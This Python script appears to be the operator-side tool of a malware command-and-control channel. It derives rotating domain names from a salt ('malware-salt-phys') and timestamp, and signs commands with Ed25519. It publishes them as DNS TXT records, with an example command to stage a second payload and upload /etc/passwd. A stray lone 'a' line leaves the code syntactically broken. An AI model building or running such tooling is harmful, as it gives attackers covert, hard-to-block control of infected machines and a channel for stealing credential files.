# registrar_ed25519_cli.py
"""
Verbose registrar utility that:
  • Generates/rotates an Ed25519 key-pair (base64 files under ./keys)
  • Derives a deterministic host label from salt + UTC timestamp
  • Builds and signs a control payload (host|not_before|valid_until|command|action)
  • Emits the DNS TXT line to publish under _auth.<host>
  • Optionally updates zone_records.txt with A and TXT entries (--update)

Usage examples
--------------
# Generate keys, sign a default payload valid 60 min on .com
python3 registrar_ed25519_cli.py --valid-minutes 60 

# Rotate keys, embed a command, update zone file
python3 registrar_ed25519_cli.py --rotate-key \
    --tld it --cmd RUN_STAGE_2 --action "upload:/etc/passwd" --update
"""
import argparse
import base64
import datetime
import hashlib
import json
import os
import sys
from pathlib import Path
import nacl.signing

# Constants
KEY_DIR = Path("keys")
PRIV_FILE = KEY_DIR / "ed25519_priv.b64"
PUB_FILE  = KEY_DIR / "ed25519_pub.b64"
DEFAULT_ZONE = Path("zone_records.txt")
FAKE_IP = "127.0.0.1"

# Verbose print
def v(msg: str):
    print(f"[+] {msg}")
a
# Load or generate key
def load_or_generate(rotate: bool) -> nacl.signing.SigningKey:
    KEY_DIR.mkdir(exist_ok=True)
    if rotate or not PRIV_FILE.exists():
        v("Generating fresh Ed25519 key-pair …")
        sk = nacl.signing.SigningKey.generate()
        PRIV_FILE.write_text(base64.urlsafe_b64encode(sk._seed).decode())
        PUB_FILE.write_text(base64.urlsafe_b64encode(sk.verify_key.encode()).decode())
        v(f"Private key → {PRIV_FILE}")
        v(f"Public  key → {PUB_FILE}")
    else:
        v("Loading existing private key …")
    seed = base64.urlsafe_b64decode(PRIV_FILE.read_text().strip())
    return nacl.signing.SigningKey(seed)

# Derive host label
def derive_label(salt: str, ts: datetime.datetime) -> str:
    raw = f"{salt}|{ts.isoformat(timespec='seconds')}"
    label = hashlib.sha256(raw.encode()).hexdigest()[:12]
    v(f"Derived label: {label}")
    return label

# Build signed payload
def build_payload(host, nbf, vto, cmd, act, sk):
    fields = [host, nbf, vto, cmd, act]
    msg = "|".join(fields).encode()
    signature = sk.sign(msg).signature
    payload = {"host": host, "not_before": nbf, "valid_until": vto,
               "command": cmd, "action": act,
               "sig": base64.urlsafe_b64encode(signature).decode()}
    return payload

# Encode TXT record
def encode_txt(payload: dict) -> str:
    json_payload = json.dumps(payload, separators=(",", ":"))
    txt_encoded = base64.urlsafe_b64encode(json_payload.encode()).decode()
    v(f"TXT payload size: {len(txt_encoded)} bytes")
    return txt_encoded

# Update zone file
def update_zone(zone_file: Path, host: str, txt_encoded: str):
    lines = []
    if zone_file.exists():
        lines = zone_file.read_text().splitlines()
    # Filter existing entries for this host
    prefix_a = f"{host} A "
    prefix_txt = f"_auth.{host} TXT "
    new_lines = [l for l in lines if not (l.startswith(prefix_a) or l.startswith(prefix_txt))]
    # Append A record and TXT record
    new_lines.append(f"{host} A {FAKE_IP}")
    new_lines.append(f"_auth.{host} TXT {txt_encoded}")
    zone_file.write_text("\n".join(new_lines) + "\n")
    v(f"Zone file '{zone_file}' updated with host {host}")

# Main
if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Ed25519 registrar (verbose, with zone update)")
    ap.add_argument("--tld", default="com")
    ap.add_argument("--salt", default="malware-salt-phys")
    ap.add_argument("--timestamp", help="ISO timestamp UTC (default: now)")
    ap.add_argument("--valid-minutes", type=int, default=90)
    ap.add_argument("--cmd", default="")
    ap.add_argument("--action", default="")
    ap.add_argument("--label", help="Override auto-label")
    ap.add_argument("--rotate-key", action="store_true")
    ap.add_argument("--update", action="store_true", help="Update zone_records.txt with new entries")
    ap.add_argument("--zone-file", default=DEFAULT_ZONE, type=Path,
                    help="Path to zone_records.txt to update")
    args = ap.parse_args()

    # Timestamp
    ts = (datetime.datetime.fromisoformat(args.timestamp).replace(tzinfo=datetime.timezone.utc)
          if args.timestamp else datetime.datetime.now(datetime.timezone.utc))
    v(f"Timestamp: {ts.isoformat()}")

    # Key loading
    sk = load_or_generate(args.rotate_key)
    label = args.label or derive_label(args.salt, ts)
    host = f"{label}.{args.tld}"
    v(f"Full host: {host}")

    # Validity
    nbf = ts.isoformat(timespec="seconds")
    vto = (ts + datetime.timedelta(minutes=args.valid_minutes)).isoformat(timespec="seconds")
    v(f"Validity window: {nbf} ➜ {vto}")

    # Payload
    payload = build_payload(host, nbf, vto, args.cmd, args.action, sk)
    txt_encoded = encode_txt(payload)

    # Output DNS snippet
    print("\n; ---------- DNS entries ----------")
    print(f"{host} A {FAKE_IP}")
    print(f"_auth.{host} TXT {txt_encoded}")
    print("; --------------------------------")

    # Optionally update zone file
    if args.update:
        update_zone(args.zone_file, host, txt_encoded)

    # Print public key
    print("\nPublic key for clients (base64url):")
    print(PUB_FILE.read_text().strip())
